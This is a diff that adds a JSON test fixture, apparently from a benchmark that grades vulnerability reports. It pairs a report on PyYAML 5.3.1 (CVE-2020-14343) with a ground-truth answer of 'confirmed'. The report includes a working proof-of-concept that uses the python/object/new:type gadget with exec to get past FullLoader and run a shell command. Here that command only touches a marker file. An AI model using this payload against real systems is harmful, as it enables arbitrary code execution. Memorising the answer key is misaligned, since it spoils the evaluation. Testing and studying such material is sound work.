@@ -1,0 +1,19 @@
+{
+  "report": {
+    "report_id": "pyyaml-affected",
+    "package": "pyyaml",
+    "affected_version": "5.3.1",
+    "title": "Arbitrary code execution via FullLoader bypass in PyYAML",
+    "body": "I found a vulnerability in this package. yaml.load with FullLoader can be escaped through a python/object/new:type gadget to reach exec.\n\nTracked as CVE-2020-14343.\n\nProof of concept:\n\n```python\nimport os, tempfile, yaml\ns = os.path.join(tempfile.gettempdir(), \"slopgate_pyyaml\")\ntry:\n    os.remove(s)\nexcept OSError:\n    pass\ncode = \"__import__('os').system('touch ' + r'%s')\" % s\npayload = (\n    \"!!python/object/new:type\\n\"\n    \"  args: [\\\"z\\\", !!python/tuple [], {\\\"extend\\\": !!python/name:exec }]\\n\"\n    \"  listitems: \\\"%s\\\"\\n\" % code\n)\ntry:\n    yaml.load(payload, Loader=yaml.FullLoader)\nexcept Exception as e:\n    print(\"raised:\", type(e).__name__, str(e)[:160])\nprint(\"SLOPGATE:REPRODUCED\" if os.path.exists(s) else \"SLOPGATE:NOT_REPRODUCED\")\n```\n",
+    "reporter": "researcher",
+    "ecosystem": "python"
+  },
+  "ground_truth": {
+    "expected_verdict": "confirmed",
+    "package": "pyyaml",
+    "fixed_version": "6.0",
+    "cve": "CVE-2020-14343",
+    "source": "GHSA/NVD",
+    "note": "real vuln, affected version (sandbox-verified)"
+  }
+}
